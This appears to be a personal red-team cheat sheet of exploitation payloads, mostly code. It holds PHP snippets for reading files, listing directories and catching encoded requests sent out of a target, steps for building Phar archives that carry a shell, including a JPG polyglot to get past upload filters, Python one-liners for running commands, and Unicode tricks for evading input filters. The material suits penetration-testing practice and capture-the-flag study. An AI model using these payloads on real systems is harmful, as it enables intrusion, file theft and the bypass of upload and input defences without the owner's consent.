# Exploitation Payloads

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## PHP

<div class="row row-cols-lg-2"><div>

#### PHP â€” POC

We often run `phpinfo` to get information.

```php!
<?php phpinfo() ?>
```

<br>

#### PHP â€” Read a file

There are multiple functions you might use:

```php!
<?php
$fileContents = file_get_contents('index.php');
$fileContents = show_source('index.php', true);
$fileContents = highlight_file('index.php', true);
$fileContents = readfile('index.php');
echo $fileContents;
?>
```

Base64 encoding is not always necessary, especially with `show_source`.

```php!
$fileContents = base64_encode($fileContents);
```

<br>

#### PHP â€” Catch Requests

Decode `zlib` compressed and `base64` encoded payload.

```php!
$p=str_replace(" ", "+", $_GET['p']);
$r=zlib_decode(base64_decode($p));
file_put_contents('requests.txt', "Request:\n$r\n", FILE_APPEND | LOCK_EX);
```
```php!
if ($_SERVER["REQUEST_METHOD"] === "POST") {} // ...
```
</div><div>

#### PHP â€” Execute Shell Commands

Refer to [webshells#php](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md#php-web-shell).

<br>

#### PHP â€” Directory Listing

A few different ways to achieve the same output:

```php!
<?php
var_dump(scandir("."));

$files = scandir(".");
foreach ($files as $file) {
    echo $file;
}

$dir=dir('.');
while ($f = $dir->read()) {
    echo $f;
}

$dir = opendir(".");
while($f = readdir($dir)) {
    echo $f;
}
```
</div></div>

<hr class="sep-both">

## Phar

[![file_upload_polyglot](../../../../_badges/rootme/web_server/file_upload_polyglot.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

<div class="row row-cols-lg-2"><div>

Simply zipping the PHP may work. Otherwise, you can use:

```php!
<?php // Run 'php --define phar.readonly=0 gen.php'
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
// or: $phar->addFile('shell.php', 'shell.php');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

â¡ï¸ `shell.php` is the file inside the archive.
</div><div>

To create a **Polyglot Phar** <small>(Ex: JPG with \xff\xd8 and \xff\xd9)</small>

```php!
<?php // php --define phar.readonly=0 gen.php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub("\xff\xd8\xff\xd9\n<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
```

ğŸ“š For reference, `include 'phar://./shell.phar/shell.php';`
</div></div>

<hr class="sep-both">

## Python

<div class="row row-cols-lg-2"><div>

Simple python code to run a command.

```py
import os;os.system('ls -1a');
import os;os.popen("ls -1a").read();
import subprocess; subprocess.run(['ls', '-1a']);
import subprocess;print(subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, text=True).stdout)
```

A few commands to craft alternative payloads:

```py
builtins.__dict__                        # builtins
import keyword; print(keyword.kwlist)    # keywords
import string; print(string.punctuation) # symbols
```
</div><div>

A few utilities to bypass filters:

* `chr(i)` such as `chr(46)` for `.`
* Alternative characters: `gloï½‚als()`, `ğ˜¦ğ˜¹ğ˜¦ğ˜¤`, `ğ™šğ“ğ“®ğ˜¤`. You can use [ItalicTextGenerator](https://lingojam.com/ItalicTextGenerator)
* ...
</div></div>